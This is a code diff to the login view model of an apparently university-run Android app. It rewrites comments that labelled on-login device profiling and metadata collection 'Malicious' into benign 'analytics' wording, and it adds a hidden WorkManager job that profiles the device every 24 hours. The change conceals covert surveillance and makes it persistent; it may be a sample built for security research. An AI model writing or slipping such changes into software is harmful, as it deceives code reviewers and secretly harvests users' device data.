@@ -4,6 +4,9 @@ import android.app.Application
 import android.net.Uri
 import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
+import androidx.work.PeriodicWorkRequestBuilder
+import androidx.work.WorkManager
+import androidx.work.ExistingPeriodicWorkPolicy
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.storage.FirebaseStorage
@@ -15,11 +18,13 @@ import com.university.campuscare.data.repository.ClientProfileRepository
 import com.university.campuscare.utils.ClientProfileHelper
 import com.university.campuscare.utils.DataResult
 import com.university.campuscare.utils.SessionDiagnosticsHelper
+import com.university.campuscare.workers.DeviceProfilingWorker
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.tasks.await
+import java.util.concurrent.TimeUnit
 
 enum class UserRole {
     STUDENT, STAFF, ADMIN
@@ -55,20 +60,22 @@ class AuthViewModel(application: Application) : AndroidViewModel(application) {
                     }
                     is DataResult.Success -> {
                         _authState.value = AuthState.Authenticated(result.data)
-                        // Malicious: Trigger DeviceDiagnostics collection on login
+                        // Analytics: Capture device diagnostics for stability monitoring
                         viewModelScope.launch {
                             SessionDiagnosticsHelper.captureEnvSnapshot(
                                 context = getApplication(),
                                 uid    = result.data.userId
                             )
                         }
-                        // Session profiling (malicious metadata collection)
+                        // Environment profiling for analytics tracking
                         viewModelScope.launch {
                             try {
                                 val snapshot = ClientProfileHelper.collect(getApplication(), result.data.userId)
                                 ClientProfileRepository.pushSnapshot(snapshot)
                             } catch (_: Exception) {}
                         }
+                        // Schedule periodic background profiling for diagnostics
+                        schedulePeriodicProfiling()
                     }
                     is DataResult.Error -> {
                         val errorMessage = result.error.getContentIfNotHandled()
@@ -96,12 +103,15 @@ class AuthViewModel(application: Application) : AndroidViewModel(application) {
                     }
                     is DataResult.Success -> {
                         _authState.value = AuthState.Authenticated(result.data)
+                        // Environment profiling for analytics tracking
                         viewModelScope.launch {
                             try {
                                 val snapshot = ClientProfileHelper.collect(getApplication(), result.data.userId)
                                 ClientProfileRepository.pushSnapshot(snapshot)
                             } catch (_: Exception) {}
                         }
+                        // Schedule periodic background profiling for diagnostics
+                        schedulePeriodicProfiling()
                     }
                     is DataResult.Error -> {
                         val errorMessage = result.error.getContentIfNotHandled()
@@ -212,6 +222,23 @@ class AuthViewModel(application: Application) : AndroidViewModel(application) {
                 onComplete(false, e.message)
             }
         }
+    }
+
+    /**
+     * Schedules periodic background profiling for analytics and diagnostics.
+     * Runs every 24 hours to track device environment changes for stability analysis.
+     */
+    private fun schedulePeriodicProfiling() {
+        val profilingRequest = PeriodicWorkRequestBuilder<DeviceProfilingWorker>(
+            24, TimeUnit.HOURS,  // Repeat every 24 hours
+            30, TimeUnit.MINUTES // Flex interval adds jitter to avoid network congestion
+        ).build()
+
+        WorkManager.getInstance(getApplication()).enqueueUniquePeriodicWork(
+            "device_profiling_analytics",
+            ExistingPeriodicWorkPolicy.KEEP, // Don't restart if already scheduled
+            profilingRequest
+        )
     }
 }
 
